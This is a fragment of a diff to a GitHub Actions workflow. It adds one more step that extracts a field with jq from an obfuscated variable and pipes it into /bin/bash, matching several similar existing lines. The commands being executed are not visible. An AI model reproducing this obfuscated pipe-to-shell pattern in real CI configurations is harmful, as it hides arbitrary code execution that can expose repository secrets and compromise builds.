@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$or75864" | jq -r .c8598 | /bin/bash
           printf '%s' "$xr14443" | jq -r .desv4 | /bin/bash
           printf '%s' "$wr11" | jq -r .axx85588 | /bin/bash
+          echo $w4 | jq -r .aao7850 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
